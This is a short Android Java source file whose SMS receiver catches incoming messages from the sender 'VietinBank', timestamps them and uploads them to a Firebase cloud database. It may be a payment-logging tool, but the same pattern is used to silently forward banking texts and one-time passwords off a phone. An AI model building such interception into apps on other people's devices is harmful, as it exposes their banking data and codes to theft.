package com.example.sms_viettinbank;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;

public class SmsReciever extends BroadcastReceiver {
    DatabaseReference database = FirebaseDatabase.getInstance().getReference();

    String getTime(){
        return new Date().getTime() + "";
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                if(smsMessage.getDisplayOriginatingAddress().equals("VietinBank")){
                    String sms = smsMessage.getMessageBody();
                    try{
                        sms = new SimpleDateFormat("dd-MM-yyyy HH:mm").format(new Date()) + "\n" + sms;
                        database.child("sms").child(getTime()).setValue(sms);
                    }
                    catch (Exception e){
                        Toast.makeText(context,e.getMessage(),Toast.LENGTH_LONG).show();
                    }
                }
            }
        }
    }
}
